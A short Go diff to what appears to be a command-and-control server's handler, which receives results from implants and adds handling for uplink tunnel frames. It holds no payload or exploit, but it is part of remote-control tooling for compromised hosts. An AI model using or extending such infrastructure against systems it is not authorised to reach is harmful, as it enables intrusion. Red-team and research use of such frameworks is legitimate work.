@@ -130,7 +130,13 @@ func (h *Handler) results(rw http.ResponseWriter, r *http.Request, im Implant) {
 		return
 	}
 	taskID, _ := strconv.ParseInt(strings.TrimSpace(rin.TaskID), 10, 64)
-	h.M.AddResult(im.ID, taskID, rin.Output, rin.Error, rin.Exit)
+	if strings.TrimSpace(rin.TaskID) == tunnelResultID {
+		// Uplink tunnel frames: apply, but never fail the POST — a retried
+		// batch is idempotent enough and implants should not stall on it.
+		_ = h.M.IngestTunnelFrames(im.ID, rin.Output)
+	} else {
+		h.M.AddResult(im.ID, taskID, rin.Output, rin.Error, rin.Exit)
+	}
 	rw.Header().Set("Cache-Control", "no-store")
 	rw.WriteHeader(http.StatusOK)
 	_, _ = rw.Write([]byte(`{"status":"ok"}`))
